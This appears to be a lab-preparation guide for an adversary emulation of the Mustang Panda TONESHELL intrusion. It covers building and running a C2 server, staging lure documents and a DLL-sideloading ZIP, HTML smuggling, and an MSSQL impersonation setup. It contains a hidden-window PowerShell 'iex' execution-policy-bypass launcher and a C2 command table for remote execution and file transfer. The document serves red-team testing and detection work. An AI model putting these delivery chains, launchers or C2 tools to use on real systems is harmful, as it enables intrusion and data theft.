# Setup — q3-plan Lab Preparation

Pre-run checklist before executing any Phase. Steps here are operator-side — not emulated adversary behavior.

---

## Attacker Infrastructure

### TONESHELL controlServer

#### Build (one-time, on attacker host)

```bash
cd testlab-enterprise/q3-plan/resources/payloads/rce-and-c2/mustang-panda-emulation/controlServer
go mod download
go build -o controlServer -ldflags '-s -w' main.go
```

Requires Go ≥ 1.18 and CGO enabled (for `go-sqlite3`):

```bash
# Debian/Ubuntu — install build dependencies if not present
sudo apt-get install -y golang gcc libsqlite3-dev
```

#### Run

Start on the attacker host (`192.168.56.2`) before running Phase 1. Handler and REST API run in the same process — one terminal:

```bash
# On attacker host (192.168.56.2)
cd testlab-enterprise/q3-plan/resources/payloads/rce-and-c2/mustang-panda-emulation/controlServer
./controlServer -c config/lab_toneshell.yml
```

Sessions are held in-memory by default (no SQLite). To persist across restarts:

```bash
./controlServer -c config/lab_toneshell.yml -db          # create new DB
./controlServer -c config/lab_toneshell.yml -existing-db # resume existing DB
```

The REST API listens on `127.0.0.1:9999` (configured in `config/lab_restapi.yml`, loaded automatically). Use `toneshell_shell.py` to interact with sessions:

```bash
# Install dependency (one-time)
pip3 install -r requirements.txt

# Launch interactive shell
python3 toneshell_shell.py
```

Key commands inside the shell:

| Command | Effect |
|---|---|
| `sessions` | List active C2 sessions |
| `use <session_id>` | Attach to a session |
| `<any command>` | Execute shell command on implant (EXEC task) |
| `get <remote_path>` | Pull file from implant to server |
| `put <payload_name> <dest_path>` | Push file from server payloads dir to implant |
| `kill` | Send TERMINATE (implant self-destructs) |
| `detach` | Unattach, return to session-picker |
| `exit` | Quit the shell |

Use a non-default REST API port: `python3 toneshell_shell.py --port 9999`

Verify handler is listening on TCP 8443:

```bash
ss -tlnp | grep 8443
# Expected: LISTEN 0 ... 0.0.0.0:8443
```

> **Magic bytes:** The TONESHELL binary is compiled with `TONESHELL_MAGIC_0=0xC7 TONESHELL_MAGIC_1=0x3A TONESHELL_MAGIC_2=0x1F` (see `toneshell-v2/CMakePresets.json`). The handler reads `magic_bytes: "c73a1f"` from `lab_toneshell.yml` and validates all inbound packets against these bytes. If the binary is rebuilt with different magic values, update `lab_toneshell.yml` to match before starting the server.

### Adversary Staging Web Server

Phase 1 delivery variants are served by two servers. Which one must be running depends on the variant under test:

| Step (variant) | Server | Port / URL | File actually served | Lure doc staged on WS01 |
| - | - | - | - | - |
| Step 1 (browser download) | `simplefileserver` handler inside controlServer | TCP 80 — `http://192.168.56.2/files/` | `250325_Pentos_Board_Minutes.zip` | `Braavos_Competitiveness_Brief.docx` → link to `/files/...zip` |
| Step 1B (BITS download) | standalone `server.py` (shared, see below) | TCP 8080 | `250325_Pentos_Board_Minutes.zip` (Range-capable copy) | same `Braavos_Competitiveness_Brief.docx` + `BitsDownloader.exe` |
| Step 1C (HTML smuggling) | standalone `server.py` (shared, see below) | TCP 8080 | `staging.html` (smuggles a polyglot `.txt`; neither the `.txt` nor the `.hta` is ever served) | `Essos_Compliance_Update.docx` → link to `:8080/staging.html` |

Steps 1B and 1C share the same `server.py` instance on TCP 8080; Step 1 always uses the controlServer handler on TCP 80. Both can run side by side.

#### Step 1 — `simplefileserver` (controlServer handler)

The `simplefileserver` handler in controlServer serves the delivery package — no separate process needed. It starts automatically with controlServer and serves files from `../toneshell-v2/` at prefix `/files` on TCP 80.

The handler serves the whole `toneshell-v2/` tree, so stage the delivery ZIP at its root — the build artifact lives under `build/src/wsdapi/Release/` (from the repo root):

```bash
cp testlab-enterprise/q3-plan/resources/payloads/rce-and-c2/mustang-panda-emulation/toneshell-v2/build/src/wsdapi/Release/250325_Pentos_Board_Minutes.zip \
   testlab-enterprise/q3-plan/resources/payloads/rce-and-c2/mustang-panda-emulation/toneshell-v2/
```

Verify it is reachable from WS01:

```powershell
# From WS01
Invoke-WebRequest -Uri "http://192.168.56.2/files/250325_Pentos_Board_Minutes.zip" -Method Head
# Expected: StatusCode 200
```

#### Steps 1B + 1C — shared `server.py` (TCP 8080)

Step 1 (main) keeps using the controlServer `simplefileserver` handler (TCP 80, `/files`) — unchanged. The two download variants instead share **one** standalone `server.py` instance on TCP 8080, serving a single common directory — `/media/sf_share` — that must hold both files they need:

| Variant | URL served by `server.py` |
| - | - |
| Step 1B (BITS) | `http://192.168.56.2:8080/250325_Pentos_Board_Minutes.zip` |
| Step 1C (HTML smuggling) | `http://192.168.56.2:8080/staging.html` |

The standalone server is required because `simplefileserver` does not advertise `Accept-Ranges`, and BITS will not resume a transfer from a server that does not. Stage both payloads into the shared directory (from the repo root):

```bash
# 1B payload: password-protected delivery ZIP
cp testlab-enterprise/q3-plan/resources/payloads/rce-and-c2/mustang-panda-emulation/toneshell-v2/build/src/wsdapi/Release/250325_Pentos_Board_Minutes.zip \
   /media/sf_share/

# 1C payload: HTML smuggling lure page
cp testlab-enterprise/q3-plan/resources/payloads/user-trigger/html-smuggling-hta/staging.html \
   /media/sf_share/
```

Start the server (on the attacker host, `192.168.56.2`):

```bash
cd testlab-enterprise/q3-plan/resources/payloads/file-servers/http-server
python3 server.py 8080 /media/sf_share
```

Expected startup:

```text
Serving HTTP on 0.0.0.0 port 8080
Directory: /media/sf_share
Range header: Supported (BITS compatible)
```

Verify both files are reachable from WS01:

```powershell
# From WS01
$zip = Invoke-WebRequest -Uri "http://192.168.56.2:8080/250325_Pentos_Board_Minutes.zip" -Method Head
$zip.StatusCode                # Expected: 200
$zip.Headers['Accept-Ranges']  # Expected: bytes
$page = Invoke-WebRequest -Uri "http://192.168.56.2:8080/staging.html" -Method Head
$page.StatusCode               # Expected: 200
```

`simplefileserver` (TCP 80, Step 1) and `server.py` (TCP 8080, Steps 1B/1C) run side by side — do not bind the same port twice. Re-copy `staging.html` into `/media/sf_share` whenever it is regenerated with `build.py`.

### Delivery Package

Confirm the following files are prepared and in place:

**On attacker host — served by `simplefileserver` (TCP 80, `/files`), used by Step 1 only:**
- `250325_Pentos_Board_Minutes.zip` — password-protected ZIP (`Pentos`) staged at the root of `toneshell-v2/` containing:
  - `Essos Competitiveness Brief.lnk` — icon spoofed to `shell32.dll,70`
  - `EssosUpdate.exe` — renamed `wsddebug_host.exe` (signed Microsoft binary)
  - `wsdapi.dll` — attacker-controlled sideload DLL (Tully Enterprises self-signed cert)

**On attacker host — served by `server.py` (TCP 8080, `/media/sf_share`), used by Steps 1B + 1C:**
- `250325_Pentos_Board_Minutes.zip` — second copy of the same ZIP, downloaded by the Step 1B BITS job (server must advertise `Accept-Ranges` or BITS will not transfer)
- `staging.html` — HTML smuggling lure page (Step 1C); embeds a base64 blob the browser reassembles into a polyglot `Essos_Compliance_Update.txt` (PEM header + base64 of `stage1.hta`); the `.hta` is then built locally by the Win+R PowerShell launcher — **no `.txt` or `.hta` file is ever hosted**

**On WS01** — staged by operator via RDP before running Phase 1:
- `C:\Users\labuser\Desktop\Braavos_Competitiveness_Brief.docx` — Word lure document for **Steps 1 / 1B** with embedded hyperlink pointing to `http://192.168.56.2/files/250325_Pentos_Board_Minutes.zip` (source template: `resources/payloads/toneshell_spearphishing.docx`)
- `C:\Users\labuser\Desktop\Essos_Compliance_Update.docx` — Word lure document for **Step 1C only**; same lure template with the embedded hyperlink re-pointed to `http://192.168.56.2:8080/staging.html`
- `C:\Users\labuser\Downloads\BitsDownloader.exe` — unsigned C# BITS downloader, used only by the **Step 1B variant** (BITS-based delivery); staged by operator via RDP

> **BITS variant (Step 1B):** requires the Range-capable `server.py` started above. Build `BitsDownloader.exe` via [`../resources/payloads/file-servers/http-client/csharp-downloader/build.bat`](../resources/payloads/file-servers/http-client/csharp-downloader/build.bat) if missing.
>
> **HTML smuggling variant (Step 1C):** uses `Essos_Compliance_Update.docx` whose embedded hyperlink points to `http://192.168.56.2:8080/staging.html` instead of the ZIP. The page smuggles `Essos_Compliance_Update.txt` into `Downloads\` and pre-loads the launcher into the clipboard; the operator then runs it (**Win+R → Ctrl+V → Enter**):
>
> ```text
> powershell -w h -ep bypass -c "iex(gc -Raw '%USERPROFILE%\Downloads\Essos_Compliance_Update.txt')"
> ```
>
> PowerShell decodes the polyglot `.txt` into `%TEMP%\Essos_Compliance_Update.hta` and hands it to `mshta.exe`. Rebuild `staging.html` with [`../resources/payloads/user-trigger/html-smuggling-hta/build.py`](../resources/payloads/user-trigger/html-smuggling-hta/build.py) after changing the loader, then re-copy it into `/media/sf_share`.

If the package needs to be rebuilt, see:
[`../resources/payloads/rce-and-c2/mustang-panda-emulation/toneshell-v2/README.md`](../resources/payloads/rce-and-c2/mustang-panda-emulation/toneshell-v2/README.md)

---

## Network Connectivity

| Source | Destination | Port | Protocol | Required for |
| - | - | - | - | - |
| WS01 (10.12.10.30) | Attacker (192.168.56.2) | 80 | TCP | Delivery package download via simplefileserver (Phase 1) |
| WS01 (10.12.10.30) | Attacker (192.168.56.2) | 8080 | TCP | `server.py` staging: ZIP download via BITS + smuggling page (Phase 1 Step 1B / 1C) |
| WS01 (10.12.10.30) | Attacker (192.168.56.2) | 8443 | TCP | TONESHELL C2 beacon (Phase 1+) |
| WS01 (10.12.10.30) | IIS01 (10.12.10.20) | 1433 | TCP | MSSQL credential use (Phase 2) |

Verify WS01 → attacker path:

```powershell
# From WS01
Test-NetConnection -ComputerName 192.168.56.2 -Port 8443
# Expected: TcpTestSucceeded: True
```

---

## Host Baselines

### WS01

- Logged-in user: `TESTLAB\labuser` (RDP or console)
- `Braavos_Competitiveness_Brief.docx` staged to `C:\Users\labuser\Desktop\` by operator via RDP before running Phase 1
- `Essos_Compliance_Update.docx` staged to `C:\Users\labuser\Desktop\` for the Step 1C variant (hyperlink → `http://192.168.56.2:8080/staging.html`)
- Credential artifact seeded: `C:\Users\labuser\Documents\DevPortal\appsettings.json` (see [Windows Server 2022-MSSQL.md](../resources/setup/Windows%20Server%202022-MSSQL.md) Step 6)
- Optional: SSMS 20 installed with `svc_app_dev` saved connection in Credential Manager

### IIS01

- MSSQL impersonation chain configured: see [Windows Server 2022-MSSQL.md](../resources/setup/Windows%20Server%202022-MSSQL.md)
- `DevPortalDB` database exists with `svc_app_dev` login and `IMPERSONATE ON LOGIN::sa` grant
- `xp_cmdshell` **disabled** (SQL Server default — enabling it is the attack step)
- VM snapshot taken after Step 8 of the MSSQL setup doc

---

## Cleanup Reminder

Run [Cleanup.md](Cleanup.md) after each test run before re-running phases. The TONESHELL C2 session, injected shellcode in `waitfor.exe`, and `wsdapih.log` / `Web.CompressShaders.config` artifacts all persist across reboots if not cleaned.
